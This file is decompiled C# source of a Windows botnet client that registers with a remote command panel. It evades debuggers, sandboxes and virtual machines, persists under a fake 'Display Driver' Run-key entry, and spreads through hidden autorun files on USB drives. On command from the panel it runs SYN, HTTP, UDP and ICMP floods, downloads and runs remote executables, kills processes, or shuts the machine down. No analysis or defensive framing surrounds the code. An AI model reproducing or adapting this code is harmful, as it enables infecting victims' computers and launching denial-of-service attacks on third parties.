using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

internal sealed class Class0
{
	private static string string_0 = "http://software-base.net/Webpanel/bot.php";

	private static string string_1 = "dispdrv.exe";

	private static string string_2 = "1";

	private static bool bool_0 = true;

	private static bool bool_1 = true;

	private static bool bool_2 = true;

	private static bool bool_3 = false;

	private static bool bool_4 = true;

	private static bool bool_5 = false;

	private static bool bool_6 = true;

	private static bool bool_7 = true;

	private static string string_3 = "0";

	private static bool bool_8 = true;

	private static string string_4 = "dispdrv.exe";

	private static string string_5 = "0.2";

	private static string string_6 = Environment.MachineName;

	private static string string_7 = smethod_8();

	private static string string_8 = CultureInfo.InstalledUICulture.EnglishName;

	private static string string_9 = smethod_7(smethod_3());

	public static bool smethod_0(string string_10)
	{
		return Process.GetProcessesByName(string_10).Length > 0;
	}

	public static string smethod_1()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
		string result = string.Empty;
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				result = Convert.ToString(((ManagementBaseObject)val2).get_Item("Description"));
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	private static string smethod_2(string string_10, string string_11)
	{
		ServicePointManager.Expect100Continue = false;
		WebRequest webRequest = WebRequest.Create(string_10);
		webRequest.ContentType = "application/x-www-form-urlencoded";
		webRequest.Method = "POST";
		byte[] bytes = Encoding.ASCII.GetBytes(string_11);
		webRequest.ContentLength = bytes.Length;
		Stream requestStream = webRequest.GetRequestStream();
		requestStream.Write(bytes, 0, bytes.Length);
		requestStream.Close();
		WebResponse response = webRequest.GetResponse();
		if (response == null)
		{
			return null;
		}
		StreamReader streamReader = new StreamReader(response.GetResponseStream());
		return streamReader.ReadToEnd().Trim();
	}

	public static string smethod_3()
	{
		string text = smethod_4();
		string text2 = smethod_5();
		string text3 = smethod_6();
		return text + text2 + text3;
	}

	public static string smethod_4()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor WHERE DeviceID = 'CPU0'");
		string result = string.Empty;
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				result = Convert.ToString(((ManagementBaseObject)val2).get_Item("ProcessorId"));
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string smethod_5()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
		string result = string.Empty;
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				result = Convert.ToString(((ManagementBaseObject)val2).get_Item("Description"));
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string smethod_6()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_BaseBoard");
		string result = string.Empty;
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				result = Convert.ToString(((ManagementBaseObject)val2).get_Item("SerialNumber"));
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string smethod_7(string string_10)
	{
		if (string_10 != null && string_10.Length != 0)
		{
			MD5 mD = new MD5CryptoServiceProvider();
			byte[] bytes = Encoding.Default.GetBytes(string_10);
			byte[] array = mD.ComputeHash(bytes);
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < array.Length; i++)
			{
				stringBuilder.Append(array[i].ToString("x2"));
			}
			return stringBuilder.ToString();
		}
		return string.Empty;
	}

	public static string smethod_8()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		string text = string.Empty;
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			if (oSVersion.Version.Minor == 10)
			{
				text = "Windows 98";
			}
			if (oSVersion.Version.Minor == 90)
			{
				text = "Windows Me";
			}
		}
		if (oSVersion.Platform == PlatformID.Win32NT)
		{
			if (oSVersion.Version.Major == 4)
			{
				text = "Windows NT 4.0";
			}
			if (oSVersion.Version.Major == 5)
			{
				switch (oSVersion.Version.Minor)
				{
				case 0:
					text = "Windows 2000";
					break;
				case 1:
					text = "Windows XP";
					break;
				case 2:
					text = "Windows Server 2003";
					break;
				}
			}
			if (oSVersion.Version.Major == 6)
			{
				switch (oSVersion.Version.Minor)
				{
				case 0:
					text = "Windows Vista";
					break;
				case 1:
					text = "Windows 7";
					break;
				}
			}
		}
		if (text == string.Empty)
		{
			text = "Unbekannte Windows-Version";
		}
		return text;
	}

	private static void Main(string[] args)
	{
		//IL_0078: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		if (bool_0)
		{
			try
			{
				if (Debugger.IsAttached)
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (bool_1)
		{
			try
			{
				long num = 0L;
				long num2 = 0L;
				num = DateTime.Now.Ticks;
				Thread.Sleep(10);
				num2 = DateTime.Now.Ticks;
				if (num2 - num < 10L)
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (bool_2)
		{
			try
			{
				Form val = new Form();
				((Control)val).set_Text("TEST");
				val.set_Opacity(0.0);
				val.set_ShowInTaskbar(false);
				((Control)val).Show();
				if (((Control)val).get_Text() == "[#] TEST [#]")
				{
					return;
				}
				val.Close();
				string[] array = new string[12]
				{
					"CURRENTUSER", "CurrentUser", "currentuser", "SCHMIDTI", "Schmidti", "schmidti", "USERNAME", "UserName", "username", "USER",
					"User", "user"
				};
				for (int i = 0; i < array.Length; i++)
				{
					if (Environment.UserName == array[i])
					{
						return;
					}
				}
				string[] array2 = new string[7] { "JOEBOXCONTROL", "JOEBOXSERVER", "SNIFF_HIT", "SYSANALYZER", "FILEMON", "REGMON", "PROCMON" };
				for (int j = 0; j < array2.Length; j++)
				{
					if (smethod_0(array2[j]))
					{
						return;
					}
				}
			}
			catch
			{
			}
		}
		if (bool_3)
		{
			try
			{
				Process[] processesByName = Process.GetProcessesByName("NETSTAT");
				Process[] array3 = processesByName;
				foreach (Process process in array3)
				{
					process.Kill();
				}
				string[] array4 = new string[13]
				{
					"WIRESHARK", "WPE PRO", "CAIN", "SNIFFER", "WSPASS", "SMSNIFF", "SNIFFPASS", "SNPA", "NETMON", "CAPSA",
					"ETHERD", "APS", "TCPVIEW"
				};
				for (int l = 0; l < array4.Length; l++)
				{
					if (smethod_0(array4[l]))
					{
						return;
					}
				}
			}
			catch
			{
			}
		}
		if (bool_4)
		{
			try
			{
				string[] array5 = new string[4] { "VirtualBox Graphics Adapter", "VM Additions S3 Trio32/64", "S3 Trio32/64", "VMware SVGA II" };
				for (int m = 0; m < array5.Length; m++)
				{
					string text = smethod_1();
					if (text == array5[m])
					{
						return;
					}
				}
			}
			catch
			{
			}
		}
		if (bool_7)
		{
			try
			{
				Thread.Sleep(Convert.ToInt32(string_3) * 1000);
			}
			catch
			{
			}
		}
		if (bool_8)
		{
			try
			{
				Process[] processesByName2 = Process.GetProcessesByName(string_4);
				processesByName2[0].Kill();
			}
			catch
			{
			}
		}
		try
		{
			string fileName = Process.GetCurrentProcess().MainModule!.FileName;
			FileStream fileStream = new FileStream(fileName, FileMode.Open, FileAccess.Read);
			byte[] array6 = new byte[fileStream.Length];
			fileStream.Read(array6, 0, array6.Length);
			fileStream.Close();
			FileStream fileStream2 = new FileStream(Environment.GetEnvironmentVariable("TEMP") + "\\" + string_1, FileMode.Create);
			fileStream2.Write(array6, 0, array6.Length);
			fileStream2.Close();
			fileStream2.Dispose();
		}
		catch
		{
		}
		try
		{
			string name = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			registryKey.SetValue("Display Driver", Environment.GetEnvironmentVariable("TEMP") + "\\" + string_1);
			registryKey.Close();
		}
		catch
		{
		}
		if (bool_6)
		{
			try
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				DriveInfo[] array7 = drives;
				foreach (DriveInfo driveInfo in array7)
				{
					if (driveInfo.DriveType == DriveType.Removable)
					{
						string fileName2 = Process.GetCurrentProcess().MainModule!.FileName;
						if (File.Exists(driveInfo.Name + "autorun.exe"))
						{
							File.Delete(driveInfo.Name + "autorun.exe");
						}
						FileStream fileStream3 = new FileStream(fileName2, FileMode.Open, FileAccess.Read);
						byte[] array8 = new byte[fileStream3.Length];
						fileStream3.Read(array8, 0, array8.Length);
						fileStream3.Close();
						FileStream fileStream4 = new FileStream(driveInfo.Name + "autorun.exe", FileMode.Create);
						fileStream4.Write(array8, 0, array8.Length);
						fileStream4.Close();
						fileStream4.Dispose();
						File.SetAttributes(driveInfo.Name + "autorun.exe", File.GetAttributes(driveInfo.Name + "autorun.exe") | FileAttributes.Hidden);
						if (File.Exists(driveInfo.Name + "autorun.inf"))
						{
							File.Delete(driveInfo.Name + "autorun.inf");
						}
						StreamWriter streamWriter = new StreamWriter(driveInfo.Name + "autorun.inf");
						streamWriter.WriteLine("[autorun]");
						streamWriter.WriteLine("open=autorun.exe");
						streamWriter.Close();
						File.SetAttributes(driveInfo.Name + "autorun.inf", File.GetAttributes(driveInfo.Name + "autorun.inf") | FileAttributes.Hidden);
					}
				}
			}
			catch
			{
			}
		}
		if (bool_5 & !Path.GetFileName(Application.get_ExecutablePath())!.Equals(string_1))
		{
			try
			{
				string value = ":Repeat\n del " + '"' + Environment.GetCommandLineArgs()[0] + '"' + "\n if exist " + '"' + Path.GetFileName(Application.get_ExecutablePath()) + '"' + " goto Repeat \n rmdir " + Environment.SystemDirectory + '"' + "\ndel delete.bat";
				TextWriter textWriter = new StreamWriter(Environment.SystemDirectory + "\\delete.bat");
				textWriter.WriteLine(value);
				textWriter.Close();
				Process process2 = new Process();
				process2.StartInfo.FileName = Environment.SystemDirectory + "\\delete.bat";
				process2.StartInfo.UseShellExecute = false;
				process2.StartInfo.CreateNoWindow = true;
				process2.Start();
			}
			catch
			{
			}
			Environment.Exit(0);
		}
		try
		{
			string string_ = "mode=1&pcname=" + string_6 + "&botver=" + string_5 + "&country=" + string_8 + "&winver=" + string_7 + "&hwid=" + string_9;
			smethod_2(string_0, string_);
		}
		catch
		{
		}
		while (true)
		{
			try
			{
				string string_2 = "mode=2&hwid=" + string_9;
				string text2 = smethod_2(string_0, string_2);
				if (text2.Length != 0)
				{
					smethod_9(text2);
				}
			}
			catch
			{
			}
			Thread.Sleep(Convert.ToInt32(Class0.string_2) * 60000);
		}
	}

	private static void smethod_9(string string_10)
	{
		//IL_026c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0273: Expected O, but got Unknown
		//IL_029d: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a4: Expected O, but got Unknown
		try
		{
			string[] array = string_10.Split(new char[1] { '+' });
			if (string_10.StartsWith("!syn"))
			{
				try
				{
					Class1.smethod_1();
				}
				catch
				{
				}
				try
				{
					Class1.string_0 = array[1];
					Class1.int_0 = Convert.ToInt32(array[2]);
					Class1.int_1 = Convert.ToInt32(array[3]);
					Class1.int_2 = Convert.ToInt32(array[4]);
					Class1.smethod_0();
				}
				catch
				{
				}
			}
			if (string_10.StartsWith("!http"))
			{
				try
				{
					Class3.smethod_1();
				}
				catch
				{
				}
				try
				{
					Class3.string_0 = array[1];
					Class3.int_0 = Convert.ToInt32(array[2]);
					Class3.smethod_0();
				}
				catch
				{
				}
			}
			if (string_10.StartsWith("!udp"))
			{
				try
				{
					Class7.smethod_1();
				}
				catch
				{
				}
				try
				{
					Class7.string_0 = array[1];
					Class7.int_0 = Convert.ToInt32(array[2]);
					Class7.int_1 = Convert.ToInt32(array[3]);
					Class7.int_2 = Convert.ToInt32(array[4]);
					Class7.int_3 = Convert.ToInt32(array[5]);
					Class7.smethod_0();
				}
				catch
				{
				}
			}
			if (string_10.StartsWith("!icmp"))
			{
				try
				{
					Class5.smethod_1();
				}
				catch
				{
				}
				try
				{
					Class5.string_0 = array[1];
					Class5.int_0 = Convert.ToInt32(array[2]);
					Class5.int_1 = Convert.ToInt32(array[3]);
					Class5.int_2 = Convert.ToInt32(array[4]);
					Class5.int_3 = Convert.ToInt32(array[5]);
					Class5.smethod_0();
				}
				catch
				{
				}
			}
			if (string_10.StartsWith("!stopflood"))
			{
				try
				{
					Class5.smethod_1();
				}
				catch
				{
				}
				try
				{
					Class3.smethod_1();
				}
				catch
				{
				}
				try
				{
					Class1.smethod_1();
				}
				catch
				{
				}
				try
				{
					Class7.smethod_1();
				}
				catch
				{
				}
			}
			if (string_10.StartsWith("!dlex"))
			{
				try
				{
					WebClient webClient = new WebClient();
					webClient.DownloadFile(array[1], Environment.GetEnvironmentVariable("TEMP") + "\\uppdate.exe");
					Process process = new Process();
					process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\uppdate.exe";
					process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process.Start();
				}
				catch
				{
				}
			}
			if (string_10.StartsWith("!kill"))
			{
				try
				{
					Process[] processesByName = Process.GetProcessesByName(array[1]);
					processesByName[0].Kill();
				}
				catch
				{
				}
			}
			if (string_10.StartsWith("!shutdown"))
			{
				try
				{
					ManagementClass val = new ManagementClass("Win32_OperatingSystem");
					((ManagementObject)val).get_Scope().get_Options().set_EnablePrivileges(true);
					ManagementObjectEnumerator enumerator = val.GetInstances().GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementObject val2 = (ManagementObject)enumerator.get_Current();
							ManagementBaseObject methodParameters = val2.GetMethodParameters("Win32Shutdown");
							methodParameters.set_Item("Flags", (object)12);
							methodParameters.set_Item("Reserved", (object)0);
							val2.InvokeMethod("Win32Shutdown", methodParameters, (InvokeMethodOptions)null);
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				catch
				{
				}
			}
			if (string_10.StartsWith("!close"))
			{
				Environment.Exit(0);
			}
		}
		catch
		{
		}
	}
}
